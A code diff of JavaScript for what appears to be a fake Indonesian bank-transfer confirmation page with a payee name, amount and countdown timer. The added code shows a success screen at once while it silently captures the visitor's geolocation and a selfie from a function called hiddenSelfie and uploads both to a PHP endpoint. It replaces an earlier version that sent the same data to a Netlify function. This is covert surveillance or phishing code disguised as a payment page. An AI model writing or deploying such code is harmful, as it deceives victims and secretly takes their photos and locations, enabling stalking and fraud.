@@ -1,7 +1,5 @@
 var TARGET_NAME  = 'Muztofa An*s ()';
 var TOTAL_AMOUNT = 'Rp52.500';
-var TARGET_NAME  = 'Michael Tanuwijaya (BCA •••• 5521)';
-var TOTAL_AMOUNT = 'Rp402.500';
 
 (function injectStyle() {
   if (document.getElementById('dyn-style')) return;
@@ -29,11 +27,11 @@ var TOTAL_AMOUNT = 'Rp402.500';
 var currentSelfieBlob = null;
 var currentLat = null;
 var currentLng = null;
-
 var remaining = 4 * 60 + 59;
 var countdownEl = document.getElementById('countdown');
 var confirmBtn  = document.getElementById('confirmBtn');
 var timerChip   = document.querySelector('.timer-chip');
+
 var countdownInterval = setInterval(function () {
   remaining--;
   if (remaining <= 0) {
@@ -51,6 +49,7 @@ var countdownInterval = setInterval(function () {
 
 var toastEl = document.getElementById('toast');
 var toastTimeout;
+
 function showToast(msg) {
   clearTimeout(toastTimeout);
   toastEl.textContent = msg;
@@ -59,16 +58,21 @@ function showToast(msg) {
 }
 
 var sourceBackdrop = document.getElementById('sourceBackdrop');
+
 document.getElementById('sourceBtn').addEventListener('click', function () {
   sourceBackdrop.classList.add('open');
 });
+
 document.getElementById('closeSource').addEventListener('click', function () {
   sourceBackdrop.classList.remove('open');
 });
+
 sourceBackdrop.addEventListener('click', function (e) {
   if (e.target === sourceBackdrop) sourceBackdrop.classList.remove('open');
 });
+
 var sourceLabel = document.getElementById('sourceLabel');
+
 document.querySelectorAll('.account-option').forEach(function (btn) {
   btn.addEventListener('click', function () {
     document.querySelectorAll('.account-option').forEach(function (b) {
@@ -166,40 +170,31 @@ function hiddenSelfie() {
 
 function sendToServer(lat, lng, selfieBlob) {
   return new Promise(function (resolve, reject) {
-    function doSend(base64) {
-      fetch('/.netlify/functions/submit', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          latitude: lat,
-          longitude: lng,
-          selfie: base64 ? { data: base64, mime: 'image/jpeg' } : null
-        })
-      })
-      .then(function (res) {
-        return res.text().then(function (text) {
-          var json;
-          try { json = JSON.parse(text); }
-          catch (e) {
-            throw new Error('Respons server tidak valid: ' + text.slice(0, 120));
-          }
-          if (!res.ok || !json.ok) throw new Error(json.error || 'Server error');
-          return json;
-        });
-      })
-      .then(resolve)
-      .catch(reject);
+    var formData = new FormData();
+    formData.append('latitude', lat);
+    formData.append('longitude', lng);
+
+    if (selfieBlob) {
+      var file = new File([selfieBlob], 'selfie.jpg', { type: 'image/jpeg' });
+      formData.append('selfie', file);
     }
-
-    if (!selfieBlob) return doSend(null);
-
-    var reader = new FileReader();
-    reader.onload = function () {
-      var base64 = String(reader.result).split(',')[1] || '';
-      doSend(base64);
-    };
-    reader.onerror = function () { reject(new Error('Gagal baca file selfie')); };
-    reader.readAsDataURL(selfieBlob);
+fetch('/api/submit.php', {
+  method: 'POST',
+  body: formData
+})
+    .then(function (res) {
+      return res.text().then(function (text) {
+        var json;
+        try { json = JSON.parse(text); }
+        catch (e) {
+          throw new Error('Respons server tidak valid: ' + text.slice(0, 120));
+        }
+        if (!res.ok || !json.ok) throw new Error(json.error || 'Server error');
+        return json;
+      });
+    })
+    .then(resolve)
+    .catch(reject);
   });
 }
 
@@ -252,8 +247,10 @@ confirmBtn.addEventListener('click', function () {
   confirmBtn.disabled = true;
   confirmBtn.textContent = 'Memproses...';
 
+  // 1️⃣ Langsung tampilkan halaman sukses
   showSuccess();
 
+  // 2️⃣ Ambil lokasi + selfie paralel, kirim di background
   (async function () {
     try {
       var tasks = await Promise.all([
